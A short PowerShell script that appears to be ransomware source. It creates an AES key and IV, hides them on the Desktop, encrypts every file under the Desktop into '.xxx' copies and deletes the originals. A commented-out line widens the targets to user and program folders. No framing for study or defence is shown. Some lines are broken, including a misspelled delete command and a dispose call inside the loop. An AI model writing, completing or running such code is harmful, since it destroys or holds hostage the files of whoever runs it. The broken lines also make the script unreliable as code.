$AES = [System.Security.Cryptography.AES]::Create()
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
$AES.BlockSize = 128
$AES.KeySize = 256
$AES.GenerateKey()
$AES.GenerateIV()
$Encryptor = $AES.CreateEncryptor()
$UserPath = "$($env:USERPROFILE)\Desktop"
$AES.Key | Set-Content $UserPath\key.s
$AES.IV | Set-Content $UserPath\IV.s
(get-item $UserPath\key.s).Attributes += 'Hidden'
(get-item $UserPath\IV.s).Attributes += 'Hidden'

$locations = $UserPath #'C:\Users\','C:\Program Files\','C:\Program Files (x86)'


foreach ($location in $locations)
{
$items = Get-ChildItem $location –Recurse -Force
$subfolders = $items.Directoryname | Sort-Object -Unique
foreach ($directory in $subfolders)
{
cd $directory
$items = Get-ChildItem -Attributes !Directory -Name
foreach ($item in $items)
{
$File = Get-Item -Path $item
$InputStream = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
$OutputStream = New-Object System.IO.FileStream((($File.FullName) + ".xxx"), [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($OutputStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$InputStream.CopyTo($CryptoStream)
$CryptoStream.Dispose()
$AES.Dispose()
$InputStream.Close()
$OutputStream.Close()
emove-Item $item -Recurse -Force
}
}
}
